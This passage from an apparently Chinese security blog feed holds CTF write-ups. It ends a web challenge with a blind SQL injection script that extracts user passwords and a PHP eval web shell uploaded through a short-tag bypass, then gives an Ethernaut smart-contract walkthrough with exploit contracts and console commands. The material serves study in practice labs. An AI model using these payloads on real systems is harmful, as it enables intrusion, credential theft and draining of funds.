class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">&quot; or id=if(ascii(substr((select password from users),%d,1))&gt;%d,1,0)#&quot;</span> % (x, mid)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;\\\\0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.get(url, params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;JFIF&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>跑出密码，登录，有文件上传，可以看到上传后文件格式为PHP</p><p><img src= "/img/loading.gif" data-lazy-src=""></p><p>短标签绕过上传shell</p><blockquote><?=@eval($_POST['cmd']);?></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;我太菜了啊，赶紧刷题，比赛打不动了&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
  </entry>
  
  <entry>
    <title>智能合约安全入门:ETHERNAUT-WriteUp</title>
    <link href="http://yoursite.com/2020/05/12/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp/"/>
    <id>http://yoursite.com/2020/05/12/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp/</id>
    <published>2020-05-12T10:35:20.000Z</published>
    <updated>2020-05-16T05:23:44.961Z</updated>
    
    <content type="html"><![CDATA[<p>这学期有区块链的大创和比赛，所以需要学一下智能合约什么的，正好看到最近的一些CTF比赛里出现了智能合约的题目，就想着玩玩这个。</p><p>在某佬博客里看到一个入门的<a href="https://ethernaut.openzeppelin.com/">靶场</a>，就先打一遍入个门。</p><a id="more"></a><h2 id="0x00-环境准备"><a href="#0x00-环境准备" class="headerlink" title="0x00 环境准备"></a>0x00 环境准备</h2><p>首先肯定是<a href="https://remix.ethereum.org/">IDE</a>，然后在自己的chrome里面安装上<code>MetaMask插件</code>，开<code>Ropsten测试网络</code>进行测试，搞好以后去找个水龙头嫖几个以太币（当然是假的）用来测试。</p><p>关于IDE的使用，写好一个合约之后，简单来说需要走的步骤就是</p><p>编译—&gt;部署—&gt;调用</p><p>每一个部署和调用都要花费一定量的以太（view和pure除外）。</p><p>在做题的过程中一定要保持靶场和小狐狸的交互性。</p><p>顺便一提</p><p>这个靶场的成功提示好魔性啊（XD</p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><h2 id="0x01-Hello-Ethernaut"><a href="#0x01-Hello-Ethernaut" class="headerlink" title="0x01 Hello Ethernaut"></a>0x01 Hello Ethernaut</h2><p>这道题就是用来测环境的，打开MetaMask然后在console跟着教程一步一步走就好。</p><h2 id="0x02-Fallback-✔"><a href="#0x02-Fallback-✔" class="headerlink" title="0x02 Fallback ✔"></a>0x02 Fallback ✔</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fallback</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] = contributions[msg.sender].add(msg.value);</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    owner.transfer(<span class="built_in">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目的目的有两个，成为owner和清空余额，直接看合约代码，要成为owner，可以转账超过1000，肯定不可行，然后最后的callback函数，只要转账大于0，贡献大于0就可，故先调用contribute()然后转账，就可以出发callback函数，成为owner，然后调用withdraw清空余额。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;)</span><br><span class="line">contract.sendTransaction(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;)</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure><p>控制台执行以上三局命令就好</p><h2 id="0x03-Fallout-✔"><a href="#0x03-Fallout-✔" class="headerlink" title="0x03 Fallout ✔"></a>0x03 Fallout ✔</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(<span class="built_in">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的仍然是成为owner，这里出题人恶趣味，给了一个看似是其实不是的构造函数，所以只要调用一下他的“构造函数”，就达成目的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.Fal1out(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><h2 id="0x04-Coin-Flip-✔"><a href="#0x04-Coin-Flip-✔" class="headerlink" title="0x04 Coin Flip ✔"></a>0x04 Coin Flip ✔</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">CoinFlip</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number.sub(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的目的变了，要猜对十次硬币，这道题考察了区块链的特性，所有数据都在链中，everything is public，所以看似正常的随机数机制在智能合约中是非常危险的，代码中可以看到，每一次随机数由上一个随机数和一个常数计算而来，而每一个数我们都是可知的，所以就很稳定的可以预测随机数。</p><p>写一个合约完成任务：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    address public addr = <span class="number">0xff19d6b5a3e5b87fdd5d4307c679440764ae8edd</span>;</span><br><span class="line">    <span class="comment">//此处为合约地址</span></span><br><span class="line">    CoinFlip a = CoinFlip(addr);</span><br><span class="line">    uint256 public FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">guess</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">          uint256 blockValue = uint256(blockhash(block.number <span class="number">-1</span>));</span><br><span class="line">          uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">           bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">           a.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后猛点十次guess方法，就可以交答案了。</p><h2 id="0x05-Telephone"><a href="#0x05-Telephone" class="headerlink" title="0x05 Telephone"></a>0x05 Telephone</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题考点在于<code>tx.origin</code>和<code>msg.sender</code>的关系，顾名思义，origin就是起源，sender就是发送者，区别在于，origin只能是用户，sender可以是用于和合约，题目要我们将owner的值变成我们用户的地址。</p><p>如果我们直接调用changeOwner函数，那么此时tx.origin和msg.sender都是我们的用户，但如果我们部署了一个合约，通过这个合约去调用了Telephone合约的changeOwner方法，那么tx.origin就是我们的用户msg.sender就是我们部署的合约，此时通过了<code>if</code>判断，目的达成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Telephone &#123;</span><br><span class="line">  function Telephone() public &#123;&#125;</span><br><span class="line">  function changeOwner(address _owner) public &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack&#123;</span><br><span class="line">    address target;</span><br><span class="line">    constructor(address param)&#123;</span><br><span class="line">        target &#x3D; param;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()&#123;</span><br><span class="line">        Telephone a &#x3D; Telephone(target);</span><br><span class="line">        a.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-Token"><a href="#0x06-Token" class="headerlink" title="0x06 Token"></a>0x06 Token</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Token</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典的整数溢出</p><p>solidity的uint存在溢出，题目设定了20的余额，所以_value=21的时候就会发生整数下溢，变成2**256-1，达成条件。</p><p>直接调用transfer函数即可。</p><h2 id="0x07-Delegation"><a href="#0x07-Delegation" class="headerlink" title="0x07 Delegation"></a>0x07 Delegation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegate</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegation</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">      <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题考点在于<code>solidity</code>中<code>call</code>方法和<code>delegatecall</code>方法的区别，call调用外部方法时，运行的上下文是外部合约，<code>delegatecall</code>调用外部方法时，运行的上下文是内部合约。</p><p>所以转账触发<code>Delegation</code>合约中的回调函数，然后<code>delegate.delegatecall(msg.data)</code>传入参数调用<code>Delegate</code>合约的<code>pwn()</code>方法，将owner变成自己。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: web3.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure><h2 id="0x08-Force"><a href="#0x08-Force" class="headerlink" title="0x08 Force"></a>0x08 Force</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;&#125;</span><br></pre></td></tr></table></figure><p>好嘛，干脆代码了</p><p>目标是给force钱，但是这个合约没有payable，但是我了解到，solidity有一个特性，如果调用一个合约的<code>selfdestruct</code>，即自毁方法，那么它临死之前会将自己的所有余额转给某合约，而且不会触发该合约的callback方法。</p><p>该题解题思路为：创建一个合约，给合约转账，然后触发这个合约的自毁，从而给目标合约成功转账。</p><h2 id="0x09-Vault"><a href="#0x09-Vault" class="headerlink" title="0x09 Vault"></a>0x09 Vault</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Vault</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目目标是要将locked变量的值false掉，首先要得到password，虽然这个password是一个private，但是我们知道，everything is public，就算是私有的变量也是可知的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(web3.toAscii(y))&#125;);</span><br></pre></td></tr></table></figure><p>用以上代码就可以获得password的值，然后调用unlock函数就可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这学期有区块链的大创和比赛，所以需要学一下智能合约什么的，正好看到最近的一些CTF比赛里出现了智能合约的题目，就想着玩玩这个。&lt;/p&gt;
&lt;p&gt;在某佬博客里看到一个入门的&lt;a href=&quot;https://ethernaut.openzeppelin.com/&quot;&gt;靶场&lt;/a&gt;，就先打一遍入个门。&lt;/p&gt;</summary>
    
    
    
    <category term="BlockChain" scheme="http://yoursite.com/categories/BlockChain/"/>
    
    
    <category term="区块链" scheme="http://yoursite.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="智能合约" scheme="http://yoursite.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>WriteUp(网鼎杯2020青龙组) - Web</title>
    <link href="http://yoursite.com/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Web/"/>
    <id>http://yoursite.com/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Web/</id>
    <published>2020-05-10T10:14:11.000Z</published>
    <updated>2020-05-10T10:34:18.407Z</updated>
    
